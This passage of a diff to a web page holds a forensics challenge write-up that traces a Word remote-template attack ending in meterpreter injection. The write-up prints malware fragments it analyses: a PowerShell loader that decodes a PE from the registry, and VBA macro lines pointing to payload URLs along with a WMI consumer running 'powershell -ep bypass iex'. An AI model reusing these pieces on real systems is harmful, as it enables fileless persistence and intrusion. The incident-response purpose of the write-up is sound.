+</span></span><span class="line"><span class="cl"><span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
+</span></span></code></pre></div><p>I&rsquo;ve used 🛠 Registry Explorer (E.Zimmermans tool) to load this hive (<code>NTUSER.DAT</code>) for user <code>john.goldberg</code>, navigated to the above mentioned key, searched for <code>AppXs42fd12c3po92dynnq2r142fs12qhvsmyy </code> subkey and exported its value. So, the code above gets the value from the registry, base64 decodes it and finally decompresses it. I&rsquo;ve then prepared a script to get the final data.</p>
 <blockquote>
 <p>📝 By the way, I wasn&rsquo;t able to run this script in PowerShell on my Win11 VM. Kept getting the error below even when running with elevated privileges. Turning off Windows Defender and Tamper Protection let the script run in the end.</p>
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">This</span> <span class="n">script</span> <span class="n">contains</span> <span class="n">malicious</span> <span class="n">content</span> <span class="n">and</span> <span class="n">has</span> <span class="n">been</span> <span class="n">blocked</span> <span class="n">by</span> <span class="n">your</span> <span class="n">antivirus</span> <span class="n">software</span><span class="p">.</span>
-    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="err">:</span> <span class="n">ParserError</span><span class="err">:</span> <span class="p">(</span><span class="err">:</span><span class="p">)</span> <span class="p">[],</span> <span class="n">ParentContainsErrorRecordException</span>
-    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="err">:</span> <span class="n">ScriptContainedMaliciousContent</span>
-</code></pre></div><p>However, the <code>ps1</code> script returned the array of decimal integers and <code>Out-File</code> just wrote these, so I didn&rsquo;t get my exe.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">This</span> <span class="n">script</span> <span class="n">contains</span> <span class="n">malicious</span> <span class="n">content</span> <span class="n">and</span> <span class="n">has</span> <span class="n">been</span> <span class="n">blocked</span> <span class="n">by</span> <span class="n">your</span> <span class="n">antivirus</span> <span class="n">software</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">CategoryInfo</span>          <span class="err">:</span> <span class="n">ParserError</span><span class="err">:</span> <span class="p">(</span><span class="err">:</span><span class="p">)</span> <span class="p">[],</span> <span class="n">ParentContainsErrorRecordException</span>
+</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="err">:</span> <span class="n">ScriptContainedMaliciousContent</span>
+</span></span></code></pre></div><p>However, the <code>ps1</code> script returned the array of decimal integers and <code>Out-File</code> just wrote these, so I didn&rsquo;t get my exe.</p>
 </blockquote>
 <p>So, this is my 🐍 script for decoding this value and writing it into a <code>.exe</code> binary file:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/veronicazvereva/Documents/dfir/cases/CyberPolygon_Forensic_Artifacts/results/malicious2.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
-    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> <span class="c1"># thank you John Machin https://stackoverflow.com/questions/6123223/howto-uncompress-gzipped-data-in-a-byte-array</span>
-</code></pre></div><p>And I&rsquo;ve got my data! A very small PE-exeuctable which was detected as meterpreter by some antivuruses, Microsoft Defender was one of them. This code is then injected into <code>winlogon</code> process. That&rsquo;s what the rest of the script is about.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/veronicazvereva/Documents/dfir/cases/CyberPolygon_Forensic_Artifacts/results/malicious2.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> <span class="c1"># thank you John Machin https://stackoverflow.com/questions/6123223/howto-uncompress-gzipped-data-in-a-byte-array</span>
+</span></span></code></pre></div><p>And I&rsquo;ve got my data! A very small PE-exeuctable which was detected as meterpreter by some antivuruses, Microsoft Defender was one of them. This code is then injected into <code>winlogon</code> process. That&rsquo;s what the rest of the script is about.</p>
 <p>How did this script get to the system? Wireshark search for <code>tmpA7Z2</code> returned no results. What&rsquo;s peculiar, <code>chainsaw</code> didn&rsquo;t return any results as well. The challenge questions do give a hint: <em>The system was compromised as the result of a Microsoft Office document opening, received by email</em>. So, this document with a malicious macro should have been spotted by the network tap and thus found in network traffic dump and may be in memory as well.</p>
 <p><code>vol3 -f memdump.mem windows.filescan.FileScan | grep doc</code> revealed quite a few docs in memory:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">0xcd83fec6b3f0.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
-0xcd83fecf2ef0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
-0xcd83ff9da700	<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>hdocvw.dll	<span class="m">216</span>
-0xcd83ffce5ef0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
-0xcd83ffeb7380	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
-0xcd84011c9190	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
-0xcd840134c090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
-0xcd84013d9c40	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
-0xcd84014b7db0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\~</span><span class="nv">$y</span> Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
-0xcd84016f9ab0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
-</code></pre></div><p>This one <code>0xcd83fec6b3f0.0\Users\john.goldberg\AppData\Local\Packages\oice_16_974fa576_32c1d314_18f6\AC\Temp\BD30DCE4.docx</code> is very suspicious. Let&rsquo;s find it in Wireshark (File -&gt; Export -&gt; IMF). This gave me a list of <code>eml</code> files (email messages format).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0xcd83fec6b3f0.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd83fecf2ef0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd83ff9da700	<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>hdocvw.dll	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd83ffce5ef0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd83ffeb7380	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd84011c9190	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd840134c090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\o</span>ice_16_974fa576_32c1d314_18f6<span class="se">\A</span>C<span class="se">\T</span>emp<span class="se">\B</span>D30DCE4.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd84013d9c40	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\W</span>hy Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd84014b7db0	<span class="se">\!</span>Work<span class="se">\R</span><span class="p">&amp;</span>D<span class="se">\~</span><span class="nv">$y</span> Saudi Arabia Will Lose The Next Oil Price War.docx	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd84016f9ab0	<span class="se">\!</span>Work<span class="se">\M</span>arketing<span class="se">\D</span>ocs<span class="se">\T</span>he OPEC Monthly Oil Market Report_Miller.docx	<span class="m">216</span>
+</span></span></code></pre></div><p>This one <code>0xcd83fec6b3f0.0\Users\john.goldberg\AppData\Local\Packages\oice_16_974fa576_32c1d314_18f6\AC\Temp\BD30DCE4.docx</code> is very suspicious. Let&rsquo;s find it in Wireshark (File -&gt; Export -&gt; IMF). This gave me a list of <code>eml</code> files (email messages format).</p>
 <p>Running <code>oleid Why\ Saudi\ Arabia\ Will\ Lose\ The\ Next\ Oil\ Price\ War.docx</code> revealed that the file did not contain any macro code. However, that&rsquo;s not the only way to exploit a doc file. Another way is to use external relationships. Uppon openning the file Word will resolve these relationships. In this case this relationship was in a template and this relationship was a link to <code>http://75.19.45.11/Supplement.dotm</code> (using <code>oleobj Why\ Saudi\ Arabia\ Will\ Lose\ The\ Next\ Oil\ Price\ War.docx</code>). What was in it? <code>wget</code> is of no use now, the host does not respond. What other options do I have? How about <code>vol.py</code>?</p>
 <p><code>vol3 -f memdump.mem windows.filescan.FileScan | grep dotm</code> shows several files of that extension:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">0xcd83ffa9b650.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
-0xcd8400f25650	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
-0xcd8401425800	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\O</span>ffice<span class="se">\R</span>ecent<span class="se">\S</span>upplement.dotm.url	<span class="m">216</span>
-0xcd8401750520	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
-0xcd84017ebef0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotmp	<span class="m">216</span>
-0xcd8401aea3f0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
-0xcd8401ca8090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotm	<span class="m">216</span>
-</code></pre></div><p>However, I couldn&rsquo;t dump it with vol3&rsquo;s dumpfile plugin. I&rsquo;ve decided to utilize vol2 for that (afterall, the developers warned us on the last year OSDFCon that this new version can be buggy for some time). May be it&rsquo;s a bug?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0xcd83ffa9b650.0<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd8400f25650	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd8401425800	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\O</span>ffice<span class="se">\R</span>ecent<span class="se">\S</span>upplement.dotm.url	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd8401750520	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormalEmail.dotm	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd84017ebef0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotmp	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd8401aea3f0	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>NetCache<span class="se">\C</span>ontent.MSO<span class="se">\4</span>29D2892.dotm	<span class="m">216</span>
+</span></span><span class="line"><span class="cl">0xcd8401ca8090	<span class="se">\U</span>sers<span class="se">\j</span>ohn.goldberg<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\T</span>emplates<span class="se">\N</span>ormal.dotm	<span class="m">216</span>
+</span></span></code></pre></div><p>However, I couldn&rsquo;t dump it with vol3&rsquo;s dumpfile plugin. I&rsquo;ve decided to utilize vol2 for that (afterall, the developers warned us on the last year OSDFCon that this new version can be buggy for some time). May be it&rsquo;s a bug?</p>
 <p>The difficulty with the vol2 is that I have to manually determine the OS version in order for it to work properly. Since this challenge is quite new, I think it&rsquo;s not Windows XP.</p>
 <p>Recovering the files that were deleted is a tough task for NTFS. The only option is to carve. In case we need a name only or of the contents of the file is small, MFT table can be used. <code>.\MFTECmd.exe -f 'C:\Users\veronicazvereva\Documents\samples\$MFT.copy0' --csv &quot;C:\Users\veronicazvereva\Documents\samples&quot; --csvf &quot;resultsmft.csv&quot;</code>.</p>
 <p>I&rsquo;ve dumped all the <code>dotm</code> files and ran <code>oleid</code> for each. Luckily, there were not too much of these and the first one was my guy:</p>
@@ -700,20 +700,20 @@ MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">
 <p>This utility indicated that this file might be malicious since it contains a macro. Let&rsquo;s extract it with <code>olevba file.0xcd8400f25650.0xcd840131b780.DataSectionObject.429D2892.dotm.dat </code> then. This is the summary:</p>
 <p><img src="images/olevba_supplement.png" alt="olevba_supplement"></p>
 <p>And below is the script itself (cropped). In general, it created Event Consumers and stuff and downloaded the <code>tmpA7Z2.ps1</code> script which is responsible for the meterpreter injection into winlogon process. A good question, how could this injection actually happen? I though Windows systems are now very secured from this type of attack.</p>
-<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
-
-<span class="n">xrUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page&#34;</span>
-    <span class="n">xfUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page&#34;</span>
-    <span class="n">xFilePath</span> <span class="o">=</span> <span class="n">Environ</span><span class="p">(</span><span class="s">&#34;APPDATA&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">&#34;\Microsoft\Office\Recent\&#34;</span>
-    <span class="n">xFileName</span> <span class="o">=</span> <span class="s">&#34;tmpA7Z2.ps1&#34;</span>
-    <span class="n">xFileFullPath</span> <span class="o">=</span> <span class="n">xFilePath</span> <span class="o">&amp;</span> <span class="n">xFileName</span>
-    <span class="n">xADSName</span> <span class="o">=</span> <span class="s">&#34;secret.txt&#34;</span>
-    <span class="n">xRegKey</span> <span class="o">=</span> <span class="s">&#34;HKEY_USERS\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy&#34;</span>
-    
-    <span class="n">PayloadConsumer</span> <span class="o">=</span> <span class="s">&#34;powershell.exe -noP -ep bypass iex -c &#34;&#34;(&#39;&#34;</span> <span class="o">&amp;</span> <span class="n">xFileFullPath</span> <span class="o">&amp;</span> <span class="s">&#34;&#39;)&#34;&#34;&#34;</span>
-
-<span class="o">[</span><span class="p">...</span><span class="o">]</span>
-</code></pre></div><h2 id="malware-3">Malware 3</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xrUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xfUrl</span> <span class="o">=</span> <span class="s">&#34;https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xFilePath</span> <span class="o">=</span> <span class="n">Environ</span><span class="p">(</span><span class="s">&#34;APPDATA&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">&#34;\Microsoft\Office\Recent\&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xFileName</span> <span class="o">=</span> <span class="s">&#34;tmpA7Z2.ps1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xFileFullPath</span> <span class="o">=</span> <span class="n">xFilePath</span> <span class="o">&amp;</span> <span class="n">xFileName</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xADSName</span> <span class="o">=</span> <span class="s">&#34;secret.txt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xRegKey</span> <span class="o">=</span> <span class="s">&#34;HKEY_USERS\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">PayloadConsumer</span> <span class="o">=</span> <span class="s">&#34;powershell.exe -noP -ep bypass iex -c &#34;&#34;(&#39;&#34;</span> <span class="o">&amp;</span> <span class="n">xFileFullPath</span> <span class="o">&amp;</span> <span class="s">&#34;&#39;)&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="p">...</span><span class="o">]</span>
+</span></span></code></pre></div><h2 id="malware-3">Malware 3</h2>
 <p>RegisteredApplication key. Doing so avoids the need for applications to modify the system PATH environment variable.</p>
 
   </div>
@@ -747,7 +747,7 @@ MD5 <span class="o">(</span>result2.exe<span class="o">)</span> <span class="o">
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
   
 
   
